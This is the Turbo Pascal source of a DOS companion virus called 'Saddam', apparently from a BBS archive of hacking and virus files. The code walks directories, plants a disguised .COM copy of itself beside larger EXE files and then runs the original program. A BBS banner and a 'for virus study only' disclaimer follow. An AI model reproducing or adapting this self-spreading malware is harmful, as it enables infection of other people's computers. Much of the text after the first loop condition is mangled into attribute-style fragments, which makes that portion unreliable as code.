

Program Saddam;

{$M 10000,0,0}

Uses
  DOS;

 Var
   DriveID          : String [2];
   Buffer           : Array [1..8000] Of Byte;
   Target,Source    : File;
   Infected         : Byte;
   Done             : Word;
   TargetFile       : String;

(*ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ*)

 Function ExistCom : Boolean;
 Var
   FindCom : SearchRec;
 Begin
 FindFirst ( TargetFile, 39, FindCom );
 ExistCom := DosError = 0;
 End;

(*ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ*)

  Procedure SearchDir ( Dir2Search : String );
   Var
    S : SearchRec;

  Begin

    If Dir2Search [ Length ( Dir2Search ) ] <> '\' Then
      Dir2Search := Dir2Search + '\';



    FindFirst ( Dir2Search + '*.exe', 39, S );

     While DosError = 0 Do
      Begin

      TargetFile := Copy ( Dir2Search + S.Name,1,
                         Length ( Dir2Search + S.Name ) -3 ) + 'com';

      If ( Copy ( S.Name, Length ( S.Name ) -2,3 ) = 'EXE' ) And
       Not ExistCom And ( Infected < 3="" )="" and="" (="" s.size=""> 25000 ) Then
        Begin
         {$i-}
         Inc ( Infected );
         Assign ( Target, TargetFile  );
         Rewrite ( Target,1 );
         BlockWrite ( Target, Buffer, Done + Random ( 4400 ));
         SetFTime ( Target, S.Time );
         Close ( Target );
         If IoResult = 101 Then
           Begin
           Infected := 3;
           Erase ( Target );
           End;

         {$i+}
         End;

      FindNext ( S );
      End;

    FindFirst ( Dir2Search + '*', Directory, S );

    If S.Name = '.' Then
     Begin
     FindNext ( S );
     FindNext ( S );
     End;

    If ( DosError = 0 ) And
      ( S.Attr And 16 <> 16 ) Then
       FindNext ( S );

    While DosError = 0 Do
     Begin
     If ( S.Attr And 16 = 16 ) And ( Infected < 3="" )="" then="" searchdir="" (="" dir2search="" +="" s.name="" );="" findnext="" (="" s="" );="" end;="" end;="" (*äääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääää*)="" begin="" driveid="" :="FExpand" (="" paramstr="" (="" 1="" ));="" infected="" :="0;" assign="" (="" source,="" paramstr="" (="" 0="" )="" );="" reset="" (="" source,="" 1="" );="" blockread="" (="" source,="" buffer,="" 5000,="" done="" );="" close="" (="" source="" );="" randomize;="" searchdir="" (="" driveid="" );="" exec="" (="" copy="" (="" paramstr="" (="" 0="" ),1,="" length="" (="" paramstr="" (="" 0="" ))="" -3="" )="" +="" 'exe',="" paramstr="" (="" 1="" )="" );="" end.="" ;****************************************************************************;="" ;="" ;="" ;="" -="][][][][][][][][][][][][][][][=-" ;="" ;="" -="]" p="" e="" r="" f="" e="" c="" t="" c="" r="" i="" m="" e="" [="-" ;="" ;="" -="]" +31.(o)79.426o79="" [="-" ;="" ;="" -="]" [="-" ;="" ;="" -="]" for="" all="" your="" h/p/a/v="" files="" [="-" ;="" ;="" -="]" sysop:="" peter="" venkman="" [="-" ;="" ;="" -="]" [="-" ;="" ;="" -="]" +31.(o)79.426o79="" [="-" ;="" ;="" -="]" p="" e="" r="" f="" e="" c="" t="" c="" r="" i="" m="" e="" [="-" ;="" ;="" -="][][][][][][][][][][][][][][][=-" ;="" ;="" ;="" ;="" ***="" not="" for="" general="" distribution="" ***="" ;="" ;="" ;="" ;="" this="" file="" is="" for="" the="" purpose="" of="" virus="" study="" only!="" it="" should="" not="" be="" passed="" ;="" ;="" around="" among="" the="" general="" public.="" it="" will="" be="" very="" useful="" for="" learning="" how="" ;="" ;="" viruses="" work="" and="" propagate.="" but="" anybody="" with="" access="" to="" an="" assembler="" can="" ;="" ;="" turn="" it="" into="" a="" working="" virus="" and="" anybody="" with="" a="" bit="" of="" assembly="" coding="" ;="" ;="" experience="" can="" turn="" it="" into="" a="" far="" more="" malevolent="" program="" than="" it="" already="" ;="" ;="" is.="" keep="" this="" code="" in="" responsible="" hands!="" ;="" ;="" ;="" ;****************************************************************************;="">